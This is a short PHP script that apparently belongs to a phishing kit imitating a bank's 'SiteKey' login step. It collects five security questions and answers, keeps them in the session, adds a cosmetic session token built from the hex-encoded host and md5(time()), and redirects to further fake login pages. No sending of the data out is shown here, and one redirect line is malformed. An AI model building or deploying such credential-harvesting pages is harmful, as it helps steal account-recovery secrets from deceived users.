<?php
ini_set("output_buffering",4096);
session_start();

//POST for Questions
$question1 = $_POST['question1'];
$question2 = $_POST['question2'];
$question3 = $_POST['question3'];
$question4 = $_POST['question4'];
$question5 = $_POST['question5'];

//POST for Answers
$answer1 = $_POST['Answer1'];
$answer2 = $_POST['Answer2'];
$answer3 = $_POST['Answer3'];
$answer4 = $_POST['Answer4'];
$answer5 = $_POST['Answer5'];



//Create session for the SiteKey Challenge
$_SESSION['QUESTIONI'] = $question1;
$_SESSION['QUESTIONII'] = $question2;
$_SESSION['QUESTIONIII'] = $question3;
$_SESSION['QUESTIONIIII'] = $question4;
$_SESSION['QUESTIONIIIII'] = $question5;

$_SESSION['ANSWERI'] = $answer1;
$_SESSION['ANSWERII'] = $answer2;
$_SESSION['ANSWERIII'] = $answer3;
$_SESSION['ANSWERIIII'] = $answer4;
$_SESSION['ANSWERIIIII'] = $answer5;

//GET HOST NAME
$host = bin2hex ($_SERVER['HTTP_HOST']);

//Validate sitekey
if ($question1=="1" ||$question2=="1" || $question3=="1"|| $question4=="1"|| $question5=="1") {
	$errors2=1;
}
else {
	$errors2=0;
}

if ( (strlen($answer1)<3)||(strlen($answer2)<3)||(strlen($answer3)<3)||(strlen($answer4)<3)||(strlen($answer5)<3) ) {
$errors3=1;
}
else{
$errors3=0;
}






if ($errors2==1||$errors3==1) {

header("Location: invalid_sitekey.php?invalid_sitekey=$errors2&session=$host").md5(time());
}


else {


$initiate="confirm_login.php?template=Initiate&valid=true&session=$host".md5(time());
header("Location: $initiate");
}

?>